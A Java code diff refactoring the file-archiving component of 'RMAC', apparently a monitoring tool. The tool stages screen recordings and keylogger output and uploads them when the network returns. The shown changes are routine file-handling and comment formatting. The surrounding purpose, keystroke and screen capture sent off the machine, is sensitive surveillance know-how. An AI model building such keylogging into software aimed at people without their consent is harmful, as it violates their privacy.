@@ -75,11 +75,11 @@ public class Archiver {
    * @param type Type of this file, which helps to determine which staging directory this file will
    *             go to before being archived.
    */
-  public synchronized void moveToArchive(File file, ArchiveFileType type) {
+  public synchronized void moveToArchive(String filePath, ArchiveFileType type) {
     String archiveLocation = this.getArchiveLocation(type);
     try {
-      Files.move(Paths.get(file.getAbsolutePath()),
-          Paths.get(archiveLocation + "\\" + file.getName()));
+      Path file = Paths.get(filePath);
+      Main.fs.move(filePath, archiveLocation + "\\" + file.getFileName());
     } catch (IOException e) {
       log.error("Could not move file to staging", e);
     }
@@ -105,18 +105,18 @@ public class Archiver {
    * <br>
    * <br>
    * <cite>
-   *   Final archiving of staging directories and moving them to /archives/pending will only happen
-   *   when the configured maximum size for staging directories has been reached, this method is an
-   *   exception to this behaviour, which will archive all the staging directories even if their sizes
-   *   has not reached the configured size limit.
-   *   <br><br>
-   *   For e.g. this method is called when network status changes from down to up, assuming the
-   *   network was down for a good amount of time, the staging directories might contain files ready
-   *   to be uploaded.
-   *   <br>
-   *   But you don't want to wait until the staging size is full and an archive is made and placed in
-   *   /archives/pending to be uploaded, since the uploading only happens from /archives/pending and
-   *   not from the staging directories directly.
+   * Final archiving of staging directories and moving them to /archives/pending will only happen
+   * when the configured maximum size for staging directories has been reached, this method is an
+   * exception to this behaviour, which will archive all the staging directories even if their sizes
+   * has not reached the configured size limit.
+   * <br><br>
+   * For e.g. this method is called when network status changes from down to up, assuming the
+   * network was down for a good amount of time, the staging directories might contain files ready
+   * to be uploaded.
+   * <br>
+   * But you don't want to wait until the staging size is full and an archive is made and placed in
+   * /archives/pending to be uploaded, since the uploading only happens from /archives/pending and
+   * not from the staging directories directly.
    * </cite>
    */
   public void uploadArchives() {
@@ -142,33 +142,36 @@ public class Archiver {
   }
 
   /**
-   * Move active screen-recording or key-logging or any other files to its respective staging directory.
+   * Move active screen-recording or key-logging or any other files to its respective staging
+   * directory.
    * <br>
    * <br>
    * <cite>
-   *   This method is only called when RMAC is shutting down, when shutdown happens the screen
-   *   recording and key logging stops abruptly, since it cannot upload these active files at this
-   *   moment, the best option is to archive them to their respective staging directories as if there
-   *   was no internet connection.
-   *   <br>
-   *   <br>
-   *   RMAC can upload these files when it boots up the next time.
+   * This method is only called when RMAC is shutting down, when shutdown happens the screen
+   * recording and key logging stops abruptly, since it cannot upload these active files at this
+   * moment, the best option is to archive them to their respective staging directories as if there
+   * was no internet connection.
+   * <br>
+   * <br>
+   * RMAC can upload these files when it boots up the next time.
    * </cite>
    */
   public void cleanUp() {
-    File[] screenFiles = new File(Constants.CURRENT_LOCATION)
-        .listFiles((dir, name) -> name.toLowerCase().endsWith(".mkv"));
-    if (screenFiles != null) {
-      for (File file : screenFiles) {
-        Main.archiver.moveToArchive(file, ArchiveFileType.SCREEN);
-      }
+    try {
+      Main.fs
+          .list(Constants.CURRENT_LOCATION)
+          .filter(path -> path.getFileName().endsWith(".mkv"))
+          .forEach(path -> Main.archiver.moveToArchive(
+              path.toAbsolutePath().toString(), ArchiveFileType.SCREEN
+          ));
+    } catch (IOException e) {
+      log.error("Could not list files in current directory", e);
     }
 
     String keyFilePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
-    File keyFile = new File(Constants.KEYLOG_LOCATION);
     try {
-      Files.move(keyFile.toPath(), Paths.get(keyFilePath), StandardCopyOption.REPLACE_EXISTING);
-      Main.archiver.moveToArchive(new File(keyFilePath), ArchiveFileType.KEY);
+      Main.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
+      Main.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
     } catch (IOException e) {
       log.error("Could not move key file to temp", e);
     }
@@ -211,7 +214,7 @@ public class Archiver {
    * Calculate the total size of all the files in the given directory.
    * <br><br>
    * <cite>
-   *   This is a shallow operation, only root level files are traversed.
+   * This is a shallow operation, only root level files are traversed.
    * </cite>
    *
    * @param dirPath The directory for which the total size needs to be calculated.
